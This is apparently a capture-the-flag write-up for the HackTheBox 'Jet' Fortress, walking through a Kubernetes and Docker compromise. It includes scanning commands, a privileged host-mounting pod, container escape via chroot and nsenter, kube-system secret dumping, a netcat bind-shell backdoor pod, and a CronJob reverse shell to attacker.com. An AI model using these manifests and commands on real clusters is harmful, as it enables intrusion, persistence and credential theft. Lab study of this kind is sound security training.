---
title: "Jet - HackTheBox Fortress"
description: "Writeup for Jet Fortress from HackTheBox, an advanced pentesting lab focused on cloud infrastructure and containers."
pubDate: 2024-11-02
platform: "htb"
category: "fortresses"
difficulty: "hard"
os: "linux"
language: en
tags: ["kubernetes", "docker", "cloud-security", "container-escape", "api-exploitation"]
logo: "/images/writeups/htb/jet/logo.png"
heroImage: "/images/writeups/htb/jet/card.png"
retired: false
estimatedTime: "6-8 hours"
points: 80
attackVectors: ["web", "cloud", "active-directory"]
certifications: ["OSCP", "OSWE"]
vulnerabilities: ["jet"]
---

# Jet - HackTheBox Fortress

**Difficulty**: Hard  
**OS**: Linux  
**Platform**: HackTheBox  
**Category**: Fortress

## Introduction

Jet is a HackTheBox Fortress that simulates a modern cloud infrastructure based on Kubernetes and Docker. This lab is designed to practice security techniques in containers and orchestration.

## Reconnaissance

### Service Scanning

```bash
nmap -sV -sC -p- 10.10.10.200
```

**Open Ports:**
- 22/tcp (SSH)
- 80/tcp (HTTP - Nginx)
- 443/tcp (HTTPS)
- 6443/tcp (Kubernetes API)
- 8080/tcp (Docker Registry)

### Web Enumeration

```bash
ffuf -u https://10.10.10.200/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Found:
- `/api/v1` - REST API
- `/health` - Health check endpoint
- `/metrics` - Prometheus metrics

## Initial Exploitation

### API Misconfiguration

Discovered that the Kubernetes API is misconfigured:

```bash
curl -k https://10.10.10.200:6443/api/v1/namespaces
```

We can enumerate resources without authentication.

### Container Deployment

Create a malicious pod to gain access:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 30; done;"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
```

### Container Escape

```bash
kubectl exec -it malicious-pod -- /bin/sh
chroot /host
```

Gain access to the underlying host.

## Lateral Movement

### Docker Registry Exploitation

```bash
curl http://10.10.10.200:8080/v2/_catalog
```

Download Docker images containing hardcoded credentials.

### Secret Extraction

```bash
kubectl get secrets -n kube-system -o yaml
```

Extract service tokens and certificates.

## Privilege Escalation

### Node Compromise

Abuse privileged container permissions:

```bash
# From privileged container
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### Cluster Admin Access

```bash
kubectl --token=<extracted_token> get nodes
kubectl --token=<extracted_token> get pods --all-namespaces
```

## Persistence

### Backdoor Container

Deploy a backdoor container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
spec:
  containers:
  - name: backdoor
    image: alpine
    command: ["/bin/sh", "-c"]
    args: ["nc -lvp 4444 -e /bin/sh"]
  hostNetwork: true
```

### CronJob Persistence

```yaml
apiVersion: batch/v1
kind: CronJob
metadata:
  name: reverse-shell
spec:
  schedule: "*/5 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: shell
            image: alpine
            command: ["/bin/sh", "-c"]
            args: ["nc attacker.com 443 -e /bin/sh"]
```

## Flags

- **User Flag**: In `/home/developer/user.txt` inside pod
- **Root Flag**: In `/root/root.txt` on host
- **Bonus Flag 1**: In production ConfigMap
- **Bonus Flag 2**: In kube-system Secret

## Conclusion

Jet is an excellent lab to learn:
- Kubernetes security
- Container escape techniques
- API exploitation
- Cloud security best practices

**Skills Learned**:
- Kubernetes enumeration
- Container breakout
- Docker registry exploitation
- Secret extraction
- Privilege escalation in containerized environments

**Recommendations**:
- Study Kubernetes RBAC
- Practice container hardening
- Learn about network policies
- Get familiar with tools like kube-hunter
